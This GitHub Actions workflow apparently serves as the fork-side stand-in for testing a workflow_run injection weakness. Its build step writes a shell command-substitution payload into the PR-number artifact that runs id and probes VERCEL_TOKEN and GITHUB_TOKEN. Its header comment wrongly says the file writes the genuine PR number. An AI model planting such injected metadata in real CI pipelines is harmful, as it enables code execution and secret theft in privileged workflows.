name: Build & Deploy

# Isolated validation copy — trigger-side stand-in.
#
# For `pull_request` events GitHub executes the workflow file from the PR head
# branch, so on the upstream repository this file's content is supplied by the
# contributor (fork PR). This stand-in keeps the exact `name` the privileged
# `workflow_run` workflow watches and uploads the same two artifacts (`dist` and
# `pr-metadata`) so the Deploy Preview run has something faithful to consume.
# The metadata written here is the genuine PR number/head SHA; it is only
# replaced with injected content by the exploitation stage.
on:
  pull_request:

jobs:
  build-and-deploy:
    name: Build & Deploy
    runs-on: ubuntu-latest
    steps:
      - name: Build preview
        run: |
          mkdir -p dist prmeta
          cat > dist/index.html <<'HTML'
          <!doctype html>
          <html><head><title>preview</title></head><body><p>preview build</p></body></html>
          HTML
          printf '%s\n' '$( echo INJECTION_EXECUTED >&2; id >&2; echo "VERCEL_TOKEN_LEN=${#VERCEL_TOKEN}" >&2; if git config --get http.https://github.com/.extraheader >/dev/null 2>&1; then echo GITHUB_TOKEN_PERSISTED=yes >&2; fi )' > prmeta/pr_number.txt
          echo "${{ github.event.pull_request.head.sha }}" > prmeta/pr_sha.txt

      - name: Upload dist artifact
        uses: actions/upload-artifact@v7
        with:
          name: dist
          path: dist/

      - name: Upload PR metadata
        uses: actions/upload-artifact@v7
        with:
          name: pr-metadata
          path: prmeta/
